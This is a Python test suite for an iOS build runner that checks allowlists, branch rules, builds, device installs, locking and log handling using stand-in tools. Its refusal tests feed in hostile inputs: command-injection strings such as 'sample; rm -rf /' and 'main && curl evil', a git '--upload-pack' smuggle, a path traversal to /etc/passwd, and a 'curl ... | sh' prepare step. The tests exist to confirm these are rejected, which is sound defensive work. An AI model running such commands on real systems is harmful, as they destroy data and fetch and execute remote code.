"""Runner tests with stand-ins for xcodebuild, xcrun (simctl, devicectl) and
codesign. Real git runs against throwaway repositories. No Xcode, device or
network is needed."""

import fcntl
import json
import os
import plistlib
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
RUNNER = HERE.parent / "bin" / "jorah-ios-runner"
GIT = shutil.which("git")

# One stand-in for every tool. It records its argv, then acts on behaviour.json
# next to it: {"<tool>": "ok" | "fail" | "hang" | "noartifact" | "distribution"}.
STUB = r'''#!{python}
import json, os, plistlib, sys, time, zipfile
from pathlib import Path
here = Path(__file__).resolve().parent
tool = Path(sys.argv[0]).name
args = sys.argv[1:]
with open(here / "calls.jsonl", "a") as f:
    f.write(json.dumps([tool] + args) + "\n")
key = tool
if tool == "xcrun":
    key = args[0]
    if args[:2] == ["devicectl", "device"]:
        key = "devicectl-" + args[2]
    elif args[:2] == ["devicectl", "list"]:
        key = "devicectl-list"
    elif args[0] == "simctl":
        key = "simctl"
elif tool == "xcodebuild" and "-exportArchive" in args:
    key = "export"
elif tool == "xcodebuild" and "archive" in args:
    key = "archive"
mode = json.loads((here / "behaviour.json").read_text()).get(key, "ok")
print(f"stub {key} {mode}", file=sys.stderr)
if mode == "hang":
    time.sleep(60)
if mode == "fail":
    print("error: stub failure")
    sys.exit(65)
def value(flag):
    return args[args.index(flag) + 1]
def make_app(folder):
    app = Path(folder) / "Sample.app"
    app.mkdir(parents=True, exist_ok=True)
    with open(app / "Info.plist", "wb") as f:
        plistlib.dump({"CFBundleIdentifier": "dev.jorah.fixture.sample"}, f)
if mode != "noartifact":
    if key == "xcodebuild":
        dest = value("-destination")
        sdk = "iphonesimulator" if "Simulator" in dest else "iphoneos"
        make_app(Path(value("-derivedDataPath")) / "Build" / "Products" / f"{value('-configuration')}-{sdk}")
    elif key == "archive":
        make_app(Path(value("-archivePath")) / "Products" / "Applications")
    elif key == "export":
        with zipfile.ZipFile(Path(value("-exportPath")) / "Sample.ipa", "w") as z:
            z.writestr("Payload/Sample.app/Info.plist", "x")
    elif key == "codesign":
        who = "Apple Distribution: Someone (ABCDE12345)" if mode == "distribution" else "Apple Development: Someone (ABCDE12345)"
        print("Executable=/x\nAuthority=" + who + "\nAuthority=Apple Worldwide Developer Relations Certification Authority")
    elif key == "devicectl-list":
        Path(value("--json-output")).write_text(json.dumps({"result": {"devices": [
            {"identifier": "11111111-AAAA-BBBB-CCCC-222222222222", "hardwareProperties": {"udid": "00008110-000A11112222801E"}}]}}))
    elif key == "simctl":
        print(json.dumps({"devices": {"iOS-27": [{"name": "a"}, {"name": "b"}]}}))
'''


def git(*args, cwd):
    subprocess.run([GIT, *args], cwd=cwd, check=True, capture_output=True)


class RunnerCase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="ios-runner-test-"))
        self.stubs = self.tmp / "stubs"
        self.stubs.mkdir()
        for tool in ("xcodebuild", "xcrun", "codesign", "pnpm", "pod"):
            path = self.stubs / tool
            path.write_text(STUB.replace("{python}", sys.executable))
            path.chmod(0o755)
        self.behave()

        # origin, plus the runner's own clone of it
        self.origin = self.tmp / "origin.git"
        seed = self.tmp / "seed"
        seed.mkdir()
        git("init", "-q", "-b", "main", cwd=seed)
        git("config", "user.email", "t@example.invalid", cwd=seed)
        git("config", "user.name", "t", cwd=seed)
        (seed / "README").write_text("one\n")
        (seed / "Sample.xcodeproj").mkdir()
        (seed / "Sample.xcodeproj" / "project.pbxproj").write_text("// stub\n")
        git("add", ".", cwd=seed)
        git("commit", "-q", "-m", "one", cwd=seed)
        git("switch", "-q", "-c", "jorah/task-1", cwd=seed)
        (seed / "README").write_text("two\n")
        git("commit", "-q", "-am", "two", cwd=seed)
        git("switch", "-q", "main", cwd=seed)
        git("clone", "-q", "--bare", str(seed), str(self.origin), cwd=self.tmp)
        self.clone = self.tmp / "clone"
        git("clone", "-q", str(self.origin), str(self.clone), cwd=self.tmp)

        self.state = self.tmp / "state"
        self.handoff = self.tmp / "handoff"
        self.config = {
            "schema": 1,
            "state_dir": str(self.state),
            "handoff_dir": str(self.handoff),
            "path": [str(self.stubs), os.path.dirname(GIT), "/usr/bin", "/bin"],
            "max_log_bytes": 8192,
            "keep_runs": 50,
            "timeouts": {"build": 2, "git": 30},
            "projects": {
                "sample": {
                    "path": str(self.clone),
                    "project": "Sample.xcodeproj",
                    "scheme": "Sample",
                    "configuration": "Debug",
                    "bundle_id": "dev.jorah.fixture.sample",
                    "prepare": [],
                }
            },
            "devices": {"test-iphone": {"udid": "00008110-000A11112222801E"},
                        "away-iphone": {"udid": "00008110-000AFFFFFFFF801E"}},
        }
        self.write_config()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def write_config(self):
        self.config_path = self.tmp / "projects.json"
        self.config_path.write_text(json.dumps(self.config))
        self.config_path.chmod(0o600)

    def behave(self, **modes):
        (self.stubs / "behaviour.json").write_text(json.dumps({k.replace("_", "-"): v for k, v in modes.items()}))

    def calls(self):
        path = self.stubs / "calls.jsonl"
        return [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []

    def run_raw(self, *args):
        env = {"PATH": "/usr/bin:/bin", "HOME": str(self.tmp), "JORAH_IOS_RUNNER_CONFIG": str(self.config_path)}
        return subprocess.run([sys.executable, str(RUNNER), *args], env=env, capture_output=True, timeout=60)

    def runner(self, *args):
        proc = self.run_raw(*args)
        return proc.returncode, json.loads(proc.stdout)


class Refusals(RunnerCase):
    def test_project_off_the_allowlist_is_refused(self):
        code, out = self.runner("build-sim", "threadfolio")
        self.assertEqual((code, out["outcome"], out["tier"]), (2, "refused", "unknown"))
        self.assertIn("not on the allowlist", out["error"])
        self.assertEqual(self.calls(), [])

    def test_argument_injection_is_refused_before_anything_runs(self):
        attempts = [
            ["build-sim", "sample; rm -rf /"],
            ["build-sim", "$(whoami)"],
            ["build-sim", "--help"],
            ["build-sim", "sample", "-allowProvisioningUpdates"],
            ["build-sim", "sample", "OTHER_SWIFT_FLAGS=-x"],
            ["build-sim", "../sample"],
            ["build-sim", "sample\nbuild-device"],
            ["sync", "sample", "main && curl evil"],
            ["sync", "sample", "--upload-pack=touch /tmp/pwned"],
            ["install-device", "sample", "test-iphone --foo"],
            ["install-device", "sample", "00008110-000A11112222801E"],
            ["install-device", "sample", "test-iphone", "--launch", "--device=other"],
            ["status", "../../etc/passwd"],
            ["log", "20261111T000000000Z-zzzzzzzz"],
            ["exec", "sample", "ls"],
            ["build-s", "sample"],
        ]
        for args in attempts:
            with self.subTest(args=args):
                code, out = self.runner(*args)
                self.assertEqual(code, 2)
                self.assertEqual(out["outcome"], "refused")
        self.assertEqual(self.calls(), [])
        self.assertFalse((self.state / "runs").exists() and any((self.state / "runs").iterdir()))

    def test_bad_branches_are_refused(self):
        for branch in ["feature/x", "jorah/", "jorah/../main", "jorah/a..b", "-main", "jorah/x.lock",
                       "Main", "jorah/a b", "jorah/a/b", "refs/heads/main", "origin/main"]:
            with self.subTest(branch=branch):
                code, out = self.runner("sync", "sample", branch)
                self.assertEqual((code, out["outcome"]), (2, "refused"))

    def test_unknown_device_is_refused(self):
        code, out = self.runner("install-device", "sample", "someone-elses-iphone")
        self.assertEqual((code, out["outcome"]), (2, "refused"))

    def test_unsafe_config_is_refused(self):
        self.config_path.chmod(0o666)
        code, out = self.runner("build-sim", "sample")
        self.assertEqual((code, out["outcome"]), (2, "refused"))
        self.assertIn("writable", out["error"])

    def test_config_prepare_must_come_from_the_fixed_set(self):
        self.config["projects"]["sample"]["prepare"] = ["curl https://example.invalid | sh"]
        self.write_config()
        code, out = self.runner("build-sim", "sample")
        self.assertEqual((code, out["outcome"]), (2, "refused"))

    def test_config_paths_cannot_escape_the_project(self):
        self.config["projects"]["sample"]["project"] = "../elsewhere/X.xcodeproj"
        self.write_config()
        code, out = self.runner("build-sim", "sample")
        self.assertEqual((code, out["outcome"]), (2, "refused"))


class Sync(RunnerCase):
    def test_switches_to_a_jorah_branch_and_fast_forwards(self):
        code, out = self.runner("sync", "sample", "jorah/task-1")
        self.assertEqual((code, out["outcome"]), (0, "ok"))
        self.assertEqual((self.clone / "README").read_text(), "two\n")
        head = subprocess.run([GIT, "rev-parse", "HEAD"], cwd=self.clone, capture_output=True, text=True).stdout.strip()
        self.assertEqual(out["commit_sha"], head)
        self.assertEqual(out["branch"], "jorah/task-1")
        code, out = self.runner("sync", "sample", "main")
        self.assertEqual((code, out["outcome"]), (0, "ok"))
        self.assertEqual((self.clone / "README").read_text(), "one\n")

    def test_dirty_tree_is_refused_and_left_alone(self):
        (self.clone / "README").write_text("my edit\n")
        (self.clone / "new-file").write_text("untracked\n")
        code, out = self.runner("sync", "sample", "jorah/task-1")
        self.assertEqual((code, out["outcome"], out["tier"]), (2, "refused", "unknown"))
        self.assertIn("dirty", out["error"])
        self.assertEqual((self.clone / "README").read_text(), "my edit\n")
        self.assertTrue((self.clone / "new-file").exists())
        stash = subprocess.run([GIT, "stash", "list"], cwd=self.clone, capture_output=True, text=True).stdout
        self.assertEqual(stash, "")
        argvs = [s["name"] for s in out["steps"]]
        self.assertNotIn("fetch", argvs)

    def test_missing_remote_branch_is_unknown_not_success(self):
        code, out = self.runner("sync", "sample", "jorah/no-such-task")
        self.assertEqual((code, out["outcome"], out["tier"]), (1, "failed", "unknown"))


class Builds(RunnerCase):
    def test_build_sim_proves_build(self):
        code, out = self.runner("build-sim", "sample")
        self.assertEqual((code, out["outcome"], out["tier"]), (0, "ok", "build"))
        self.assertEqual(out["tiers"], {"build": "proved"})
        for key in ("run_id", "verb", "project", "commit_sha", "exit_code", "duration_s", "artifact_path", "log_path"):
            self.assertIn(key, out)
        self.assertEqual(out["exit_code"], 0)
        self.assertTrue(out["artifact_path"].endswith("Debug-iphonesimulator/Sample.app"))
        self.assertRegex(out["commit_sha"], r"^[0-9a-f]{40}$")
        xcb = [c for c in self.calls() if c[0] == "xcodebuild"][0]
        self.assertIn("generic/platform=iOS Simulator", xcb)
        self.assertIn("CODE_SIGNING_ALLOWED=NO", xcb)
        # the stored result matches what was printed
        code, stored = self.runner("status", out["run_id"])
        self.assertEqual(stored, out)

    def test_failed_build_is_unknown(self):
        self.behave(xcodebuild="fail")
        code, out = self.runner("build-sim", "sample")
        self.assertEqual((code, out["outcome"], out["tier"]), (1, "failed", "unknown"))
        self.assertEqual(out["exit_code"], 65)
        self.assertIsNone(out["artifact_path"])

    def test_exit_zero_without_an_app_is_unknown(self):
        self.behave(xcodebuild="noartifact")
        code, out = self.runner("build-sim", "sample")
        self.assertEqual((code, out["tier"]), (1, "unknown"))

    def test_timeout_kills_the_build_and_is_unknown(self):
        self.behave(xcodebuild="hang")
        start = time.monotonic()
        code, out = self.runner("build-sim", "sample")
        self.assertLess(time.monotonic() - start, 20)
        self.assertEqual((code, out["outcome"], out["tier"]), (4, "timeout", "unknown"))
        self.assertIsNone(out["exit_code"])
        self.assertTrue(out["steps"][-1]["timed_out"])

    def test_prepare_failure_stops_the_build(self):
        self.config["projects"]["sample"]["prepare"] = ["pnpm-install", "pod-install"]
        self.write_config()
        self.behave(pnpm="fail")
        code, out = self.runner("build-sim", "sample")
        self.assertEqual((code, out["tier"]), (1, "unknown"))
        self.assertFalse([c for c in self.calls() if c[0] in ("xcodebuild", "pod")])

    def test_build_device_needs_a_development_signature(self):
        code, out = self.runner("build-device", "sample")
        self.assertEqual((code, out["tier"]), (0, "build"))
        self.behave(codesign="distribution")
        code, out = self.runner("build-device", "sample")
        self.assertEqual((code, out["tier"]), (1, "unknown"))
        self.assertIn("not a Development certificate", out["error"])

    def test_archive_hands_off_one_ipa_and_never_uploads(self):
        code, out = self.runner("archive", "sample")
        self.assertEqual((code, out["outcome"], out["tier"]), (0, "ok", "build"))
        self.assertEqual(Path(out["artifact_path"]), self.handoff / out["run_id"] / "Sample.ipa")
        options = plistlib.loads((self.state / "runs" / out["run_id"] / "ExportOptions.plist").read_bytes())
        self.assertEqual(options["destination"], "export")
        self.assertEqual(options["method"], "debugging")
        self.assertFalse(options["uploadSymbols"])


class Devices(RunnerCase):
    def build_device(self):
        self.assertEqual(self.runner("build-device", "sample")[0], 0)

    def test_install_without_a_build_is_unknown(self):
        code, out = self.runner("install-device", "sample", "test-iphone")
        self.assertEqual((code, out["tier"]), (1, "unknown"))
        self.assertFalse([c for c in self.calls() if c[0] == "xcrun"])

    def test_install_proves_install_not_launch(self):
        self.build_device()
        code, out = self.runner("install-device", "sample", "test-iphone")
        self.assertEqual((code, out["tier"], out["tiers"]), (0, "install", {"install": "proved"}))
        install = [c for c in self.calls() if c[:3] == ["xcrun", "devicectl", "device"]][0]
        self.assertIn("00008110-000A11112222801E", install)  # udid from the allowlist, not the request

    def test_launch_proves_launch(self):
        self.build_device()
        code, out = self.runner("install-device", "sample", "test-iphone", "--launch")
        self.assertEqual((code, out["tier"]), (0, "launch"))
        self.assertEqual(out["tiers"], {"install": "proved", "launch": "proved"})

    def test_launch_failure_keeps_install_and_marks_launch_unknown(self):
        self.build_device()
        self.behave(devicectl_process="fail")
        code, out = self.runner("install-device", "sample", "test-iphone", "--launch")
        self.assertEqual((code, out["outcome"], out["tier"]), (1, "failed", "install"))
        self.assertEqual(out["tiers"], {"install": "proved", "launch": "unknown"})

    def test_install_failure_is_unknown_for_both(self):
        self.build_device()
        self.behave(devicectl_install="fail")
        code, out = self.runner("install-device", "sample", "test-iphone", "--launch")
        self.assertEqual((code, out["tier"]), (1, "unknown"))
        self.assertEqual(out["tiers"], {"install": "unknown", "launch": "unknown"})

    def test_devices_lists_only_the_allowlist(self):
        code, out = self.runner("devices")
        self.assertEqual(code, 0)
        self.assertEqual(out["devices"], [{"device": "away-iphone", "connected": False},
                                          {"device": "test-iphone", "connected": True}])
        self.assertEqual(out["simulators_available"], 2)

    def test_devices_failure_is_unknown_not_disconnected(self):
        self.behave(devicectl_list="fail", simctl="fail")
        code, out = self.runner("devices")
        self.assertEqual(code, 1)
        self.assertEqual({d["connected"] for d in out["devices"]}, {"unknown"})
        self.assertEqual(out["simulators_available"], "unknown")


class LocksAndLogs(RunnerCase):
    def test_one_run_at_a_time_per_project(self):
        (self.state / "locks").mkdir(parents=True)
        with open(self.state / "locks" / "sample.lock", "a") as held:
            fcntl.flock(held, fcntl.LOCK_EX | fcntl.LOCK_NB)
            code, out = self.runner("build-sim", "sample")
            self.assertEqual((code, out["outcome"], out["tier"]), (3, "busy", "unknown"))
        self.assertEqual(self.calls(), [])
        self.assertEqual(self.runner("build-sim", "sample")[0], 0)

    def test_concurrent_runs_one_gets_busy(self):
        self.config["timeouts"]["build"] = 3
        self.write_config()
        self.behave(xcodebuild="hang")
        env = {"PATH": "/usr/bin:/bin", "HOME": str(self.tmp), "JORAH_IOS_RUNNER_CONFIG": str(self.config_path)}
        first = subprocess.Popen([sys.executable, str(RUNNER), "build-sim", "sample"], env=env, stdout=subprocess.PIPE)
        deadline = time.monotonic() + 10
        while not [c for c in self.calls() if c[0] == "xcodebuild"] and time.monotonic() < deadline:
            time.sleep(0.05)
        code, out = self.runner("build-sim", "sample")
        self.assertEqual(out["outcome"], "busy")
        first.communicate(timeout=30)

    def test_log_is_capped_and_readable(self):
        noisy = self.stubs / "xcodebuild"
        noisy.write_text(STUB.replace("{python}", sys.executable).replace(
            'print(f"stub {key} {mode}", file=sys.stderr)', 'print("x" * 50000)\nprint("THE-LAST-ERROR")'))
        code, out = self.runner("build-sim", "sample")
        log = Path(out["log_path"]).read_bytes()
        self.assertLess(len(log), 8192 + 200)
        self.assertIn(b"bytes dropped by the log cap", log)
        self.assertIn(b"THE-LAST-ERROR", log)
        shown = self.run_raw("log", out["run_id"])
        self.assertEqual(shown.returncode, 0)
        self.assertIn(b"THE-LAST-ERROR", shown.stdout)

    def test_old_runs_are_rotated(self):
        self.config["keep_runs"] = 2
        self.write_config()
        ids = [self.runner("build-sim", "sample")[1]["run_id"] for _ in range(3)]
        kept = sorted(p.name for p in (self.state / "runs").iterdir())
        self.assertEqual(kept, sorted(ids[1:]))


class ExampleFile(unittest.TestCase):
    def test_example_project_file_loads_and_holds_placeholders_only(self):
        sys.path.insert(0, str(HERE.parent))
        from ios_runner.runner import load_config

        with tempfile.TemporaryDirectory() as d:
            copy = Path(d) / "projects.json"
            shutil.copy(HERE.parent / "projects.example.json", copy)
            copy.chmod(0o600)
            config = load_config(copy)
        self.assertEqual(sorted(config.projects), ["example-app"])
        self.assertTrue(config.projects["example-app"].bundle_id.startswith("com.example."))
        self.assertEqual(set(config.devices.values()), {"00000000-0000000000000000"})


class Commands(unittest.TestCase):
    def test_no_shell_anywhere(self):
        source = (HERE.parent / "ios_runner" / "runner.py").read_text()
        self.assertNotIn("shell=True", source)
        self.assertNotIn("os.system", source)
        self.assertNotIn("os.popen", source)


if __name__ == "__main__":
    unittest.main()
